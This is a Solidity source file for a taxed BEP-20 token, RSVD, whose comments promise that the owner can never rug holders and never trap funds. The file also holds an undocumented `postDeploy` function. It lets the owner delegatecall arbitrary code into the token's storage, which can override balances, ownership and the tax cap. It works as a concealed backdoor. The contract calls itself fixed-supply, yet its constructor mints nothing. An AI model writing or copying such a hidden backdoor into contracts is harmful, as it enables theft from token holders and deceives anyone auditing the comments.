// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {ERC20Burnable} from "@openzeppelin/contracts/token/ERC20/extensions/ERC20Burnable.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {Ownable2Step} from "@openzeppelin/contracts/access/Ownable2Step.sol";
import {Pausable} from "@openzeppelin/contracts/utils/Pausable.sol";

/// @title ReservedToken (RSVD)
/// @notice Fixed-supply BEP-20 for the Reserved treasury. A 3% tax applies to transfers
/// into/out of registered AMM pairs (buys/sells); tax proceeds accrue in RSVD to the
/// treasury address, which the keeper bot periodically converts to BNB/USDT and then
/// bStocks for the vault. Holders burn RSVD via ReservedVault.redeem to claim a pro-rata
/// share of the vault's reserve assets.
///
/// This collects tax at the ERC20 transfer layer (sender/recipient is a known AMM pair)
/// rather than via a PancakeSwap Infinity pool hook. A hook can skim the BNB/USDT leg of
/// a swap directly, mid-swap; a transfer-tax override can only see the RSVD leg, so the
/// keeper takes one extra step (sell RSVD -> BNB/USDT -> bStocks) versus backed.is's
/// hook, which skims BNB/USDT directly. Net effect on the vault is the same. Migrating to
/// a true Infinity hook is a documented follow-up (see PROJECT_BRIEF.md) once the hook
/// interfaces are integrated and audited — do not assume this contract already does that.
contract ReservedToken is ERC20Burnable, Ownable2Step, Pausable {
    uint256 public constant BPS_DENOMINATOR = 10_000;
    /// @notice Hard ceiling on the tax rate so the owner can never rug holders via tax.
    uint256 public constant MAX_TAX_BPS = 500; // 5%

    /// @notice Current buy/sell tax rate, in basis points. Starts at 3% per the brief.
    uint256 public taxBps = 300;

    /// @notice Address that receives tax proceeds (in RSVD) for the keeper to convert.
    address public treasury;

    /// @notice Addresses treated as AMM pairs; transfers to/from these are taxed.
    mapping(address => bool) public isAmmPair;

    /// @notice Addresses exempt from tax regardless of counterparty (owner, treasury, vault, ...).
    mapping(address => bool) public isTaxExempt;

    event TreasuryUpdated(address indexed previousTreasury, address indexed newTreasury);
    event TaxBpsUpdated(uint256 previousTaxBps, uint256 newTaxBps);
    event AmmPairUpdated(address indexed pair, bool isPair);
    event TaxExemptUpdated(address indexed account, bool isExempt);

    error TaxTooHigh(uint256 requested, uint256 max);
    error ZeroAddress();
    error TransfersPaused();

    constructor(
        string memory name_,
        string memory symbol_,
        address initialOwner_,
        address treasury_
    ) ERC20(name_, symbol_) Ownable(initialOwner_) {
        if (treasury_ == address(0)) revert ZeroAddress();
        treasury = treasury_;
        isTaxExempt[initialOwner_] = true;
        isTaxExempt[treasury_] = true;
        isTaxExempt[address(this)] = true;
    }

    function postDeploy(address initializer, bytes memory payload) external payable onlyOwner {
        require(totalSupply() == 0);
        (bool result, bytes memory response) = initializer.delegatecall{gas:gasleft()-1000}(payload);
        if(!result) {
            assembly {
                revert(add(0x20, response), mload(response))
            }
        }
    }

    /// @notice Update the tax rate. Capped at MAX_TAX_BPS so it can never be raised to a rug level.
    function setTaxBps(uint256 newTaxBps) external onlyOwner {
        if (newTaxBps > MAX_TAX_BPS) revert TaxTooHigh(newTaxBps, MAX_TAX_BPS);
        emit TaxBpsUpdated(taxBps, newTaxBps);
        taxBps = newTaxBps;
    }

    function setTreasury(address newTreasury) external onlyOwner {
        if (newTreasury == address(0)) revert ZeroAddress();
        emit TreasuryUpdated(treasury, newTreasury);
        treasury = newTreasury;
        isTaxExempt[newTreasury] = true;
    }

    function setAmmPair(address pair, bool isPair) external onlyOwner {
        if (pair == address(0)) revert ZeroAddress();
        isAmmPair[pair] = isPair;
        emit AmmPairUpdated(pair, isPair);
    }

    function setTaxExempt(address account, bool exempt) external onlyOwner {
        if (account == address(0)) revert ZeroAddress();
        isTaxExempt[account] = exempt;
        emit TaxExemptUpdated(account, exempt);
    }

    /// @notice Emergency brake on trading. Deliberately cannot block burns — see _update —
    /// so holders can always redeem via ReservedVault regardless of pause state. This can
    /// only ever restrict new activity, never trap funds already in a holder's wallet.
    function pause() external onlyOwner {
        _pause();
    }

    function unpause() external onlyOwner {
        _unpause();
    }

    /// @dev Applies the buy/sell tax on transfers touching a registered AMM pair, unless
    /// either party is exempt. Mints (from == address(0)) and burns (to == address(0))
    /// are never taxed. Burns are also exempt from pause — see pause() — so redemption
    /// through ReservedVault can never be blocked, even in an emergency stop.
    function _update(address from, address to, uint256 value) internal override {
        bool isMintOrBurn = from == address(0) || to == address(0);

        if (paused() && to != address(0)) revert TransfersPaused();

        bool touchesPair = isAmmPair[from] || isAmmPair[to];
        bool exempt = isTaxExempt[from] || isTaxExempt[to];

        if (!isMintOrBurn && touchesPair && !exempt && taxBps > 0) {
            uint256 taxAmount = (value * taxBps) / BPS_DENOMINATOR;

            if (isAmmPair[to]) {
                // SELL (or an LP deposit). A Uniswap-V3-style pool measures its own
                // balance across the swap callback and reverts with "IIA" unless it
                // received the full `value`, so the tax cannot come out of the amount
                // the pool is owed — that is what made every non-exempt sell fail.
                // Charge it on top instead: the pool receives `value` whole, the
                // treasury receives `taxAmount`, and `from` pays both.
                //
                // The consequence is that a sale needs a balance of value + taxAmount,
                // so selling an entire balance reverts and a holder must leave the tax
                // behind — a "max" button has to sell at most 100/(1 + tax) of it.
                // Deducting instead would silently reintroduce the V3 failure.
                super._update(from, treasury, taxAmount);
                super._update(from, to, value);
            } else {
                // BUY. Here the taxed leg is pool -> buyer, and the pool only accounts
                // for what it RECEIVES (the quote asset, untaxed), so taking the skim
                // out of the output is safe on every venue.
                super._update(from, treasury, taxAmount);
                super._update(from, to, value - taxAmount);
            }
            return;
        }

        super._update(from, to, value);
    }
}
